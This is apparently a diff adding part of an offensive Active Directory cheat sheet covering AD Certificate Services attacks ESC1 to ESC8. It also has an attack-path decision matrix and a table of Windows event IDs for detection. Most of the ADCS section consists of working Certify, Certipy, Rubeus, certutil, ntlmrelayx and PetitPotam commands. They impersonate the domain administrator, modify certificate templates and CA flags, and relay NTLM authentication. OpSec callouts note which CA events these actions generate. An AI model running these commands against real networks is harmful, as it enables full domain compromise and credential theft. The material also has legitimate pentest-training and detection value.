+<Callout type="warning">
+**OpSec:** GPO version number increments on every change. SYSVOL modifications + widespread policy reapplication (Event 5312) = strong detection signature.
+</Callout>
+
+---
+
+# 6. ADCS — ESC1 through ESC8
+
+AD Certificate Services misconfigurations let you **request certificates as any user** — turning a cert into a password equivalent. ESC1 is the most common and impactful.
+
+## ESC1 — Template Substitution (Most Common)
+
+A template is vulnerable if it has: **Client Authentication EKU** + **ENROLLEE_SUPPLIES_SUBJECT** enabled + no manager approval + you have enrollment rights. Request a cert as `administrator@domain.local`.
+
+<Tabs>
+<Tab label="Enumerate (Windows)">
+
+```powershell
+Certify.exe find /vulnerable
+Certify.exe find /enrolleesuppliessubject
+```
+
+</Tab>
+<Tab label="Enumerate (Linux)">
+
+```bash
+certipy-ad find -u attacker@domain.local -p 'Password123!' -dc-ip 10.0.0.1 -vulnerable
+```
+
+</Tab>
+<Tab label="Exploit (Windows)">
+
+```powershell
+Certify.exe request /ca:CA01.domain.local\domain-CA /template:VulnTemplate /altname:administrator@domain.local
+
+# Auth with the cert
+Rubeus.exe asktgt /user:administrator /certificate:<base64_cert> /password:<pfx_password> /ptt
+```
+
+</Tab>
+<Tab label="Exploit (Linux)">
+
+```bash
+certipy-ad req -u attacker@domain.local -p 'Password123!' -ca 'CA01' -template 'VulnTemplate' -alt-name 'administrator@domain.local' -dc-ip 10.0.0.1
+
+certipy-ad auth -pfx administrator.pfx -dc-ip 10.0.0.1
+```
+
+</Tab>
+</Tabs>
+
+## ESC2 — Any Purpose EKU
+
+Same as ESC1, but the template has **no EKU** or **Any Purpose EKU** (`2.5.29.37.0`) — the cert can be used for anything. Same exploitation as ESC1.
+
+## ESC3 — Enrollment Agent
+
+Two-step attack: request an **Enrollment Agent certificate** → use it to request a cert **on behalf of** another user.
+
+<Tabs>
+<Tab label="Windows">
+
+```powershell
+Certify.exe request /ca:CA01.domain.local\domain-CA /template:EnrollmentAgent
+Certify.exe request /ca:CA01.domain.local\domain-CA /template:VulnTemplate /onbehalfof:administrator /enrollmentagentcert:<base64_cert>
+```
+
+</Tab>
+<Tab label="Linux">
+
+```bash
+certipy-ad req -u attacker@domain.local -p 'Password123!' -ca 'CA01' -template 'EnrollmentAgent' -dc-ip 10.0.0.1
+certipy-ad req -u attacker@domain.local -p 'Password123!' -ca 'CA01' -template 'VulnTemplate' -on-behalf-of administrator -enrollment-agent <pfx> -dc-ip 10.0.0.1
+```
+
+</Tab>
+</Tabs>
+
+## ESC4 — Writable Certificate Template
+
+You have **write permissions on a template object** → modify it to become ESC1-vulnerable → exploit as ESC1.
+
+<Tabs>
+<Tab label="Windows">
+
+```powershell
+# Make the template vulnerable
+Set-DomainObject -Identity "CN=TargetTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" -Set @{
+    msPKI-Enrollment-Supply-Subject = $true
+} -Verbose
+
+# Then exploit as ESC1
+Certify.exe request /ca:CA01.domain.local\domain-CA /template:TargetTemplate /altname:administrator@domain.local
+```
+
+</Tab>
+<Tab label="Linux">
+
+```bash
+certipy-ad template -u attacker@domain.local -p 'Password123!' -template 'TargetTemplate' -save-old -dc-ip 10.0.0.1
+# Edit JSON → apply → exploit as ESC1
+certipy-ad req -u attacker@domain.local -p 'Password123!' -ca 'CA01' -template 'TargetTemplate' -alt-name 'administrator@domain.local' -dc-ip 10.0.0.1
+```
+
+</Tab>
+</Tabs>
+
+## ESC5 — PKI Enrollment Misconfiguration
+
+Misconfigured enrollment endpoints or PKI infrastructure permissions. Broad category — check CA security descriptors and web enrollment service configs.
+
+## ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2
+
+**CA-level flag** that lets you supply arbitrary SANs on **any template** — makes every Client Auth template ESC1-equivalent.
+
+<Tabs>
+<Tab label="Check (Windows)">
+
+```powershell
+Certify.exe ca
+# Look for EDITF_ATTRIBUTESUBJECTALTNAME2 (flag 0x80000)
+```
+
+</Tab>
+<Tab label="Check (Linux)">
+
+```bash
+certipy-ad ca -u attacker@domain.local -p 'Password123!' -ca 'CA01' -dc-ip 10.0.0.1
+```
+
+</Tab>
+<Tab label="Exploit">
+
+```bash
+# Works on ANY template with Client Auth EKU
+certipy-ad req -u attacker@domain.local -p 'Password123!' -ca 'CA01' -template 'User' -alt-name 'administrator@domain.local' -dc-ip 10.0.0.1
+```
+
+</Tab>
+</Tabs>
+
+## ESC7 — Vulnerable Certificate Authority
+
+You have **ManageCA** or **ManageCertificates** permissions on the CA itself → enable ESC6 flag, approve pending requests, or issue certs directly.
+
+<Tabs>
+<Tab label="Windows">
+
+```powershell
+# Enable EDITF_ATTRIBUTESUBJECTALTNAME2 (requires ManageCA)
+certutil -setreg CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
+
+# Then exploit as ESC6
+Certify.exe request /ca:CA01.domain.local\domain-CA /template:User /altname:administrator@domain.local
+
+# Approve pending request (requires ManageCertificates)
+certutil -resubmit <request_id>
+```
+
+</Tab>
+<Tab label="Linux">
+
+```bash
+certipy-ad ca -u attacker@domain.local -p 'Password123!' -ca 'CA01' -dc-ip 10.0.0.1
+```
+
+</Tab>
+</Tabs>
+
+## ESC8 — NTLM Relay to AD CS
+
+**Relay NTLM auth** to the CA's HTTP enrollment endpoint → get a certificate as the relayed user. Chain with PetitPotam/PrinterBug for domain compromise.
+
+<Tabs>
+<Tab label="Linux">
+
+```bash
+# Start relay
+impacket-ntlmrelayx -smb2support -target http://CA01.domain.local/certsrv/mscep/mscep.dll -adcs --template 'VulnTemplate'
+
+# Trigger auth from a privileged user
+python3 PetitPotam.py -d domain.local -u attacker -p 'Password123!' 10.0.0.100 CA01.domain.local
+
+# Use the relayed cert
+certipy-ad auth -pfx relayed_cert.pfx -dc-ip 10.0.0.1
+```
+
+</Tab>
+<Tab label="Windows">
+
+```powershell
+python3 ntlmrelayx.py -smb2support -target http://CA01.domain.local/certsrv/mscep/mscep.dll -adcs --template 'VulnTemplate'
+Invoke-PetitPotam -Target CA01.domain.local -Listener 10.0.0.100
+```
+
+</Tab>
+</Tabs>
+
+<Callout type="warning">
+**OpSec:** ADCS attacks generate Event 4886/4887 on the CA. Requesting a cert for `administrator` while logged in as a low-priv user is obvious in logs.
+</Callout>
+
+---
+
+# Quick Reference: Attack Path Decision Matrix
+
+| Starting Condition | Attack | Tools |
+|-------------------|--------|-------|
+| Any domain user | Kerberoast / AS-REP Roast | Rubeus, Impacket |
+| GenericAll on user | Password reset | PowerView, bloodyAD |
+| GenericAll on group | Add self to group | PowerView, bloodyAD |
+| GenericAll/Write on computer | RBCD | PowerMad + Rubeus, bloodyAD |
+| WriteDacl on domain | Self-grant DCSync | PowerView, dsacls |
+| Constrained delegation (S4U) | S4U2Self + S4U2Proxy | Rubeus, Impacket |
+| Unconstrained delegation | TGT extraction | Mimikatz, Rubeus |
+| DA-equivalent access | DCSync → Golden Ticket | Mimikatz, secretsdump |
+| Computer account hash | Silver Ticket | Mimikatz, ticketer |
+| GPO write access | Local admin / scheduled task | SharpGPOAbuse |
+| ADCS ESC1 template | Request cert as admin | Certify, Certipy |
+| ADCS ESC4 template | Modify template + ESC1 | Certipy, PowerView |
+| ADCS ESC6 CA flag | Any template → ESC1 | Certify, Certipy |
+| ADCS ESC8 relay | Relay to CA enrollment | ntlmrelayx, PetitPotam |
+
+---
+
+# Detection & Event IDs
+
+| Event ID | Log Source | Attack Type | Description |
+|----------|-----------|-------------|-------------|
+| **4662** | Security | DCSync / ACL abuse | Object accessed with extended rights |
+| **4670** | Security | WriteDacl / WriteOwner | Permissions changed on an object |
+| **4724** | Security | Password reset | Password was reset |
+| **4728** | Security | Group modification | Member added to global security group |
+| **4732** | Security | Group modification | Member added to local security group |
+| **4738** | Security | Account change | User account was changed |
+| **4741** | Security | RBCD | Computer account created |
+| **4768** | Security | AS-REP Roast / Golden Ticket | Kerberos TGT request |
+| **4769** | Security | Kerberoast / Delegation | Kerberos TGS request |
+| **4886** | CA Audit | ADCS | Certificate request submitted |
+| **4887** | CA Audit | ADCS | Certificate issued |
+| **5136** | Security | ACL / RBCD / GPO | Directory object modified |
+| **5312** | Security | GPO abuse | Group Policy applied on target |
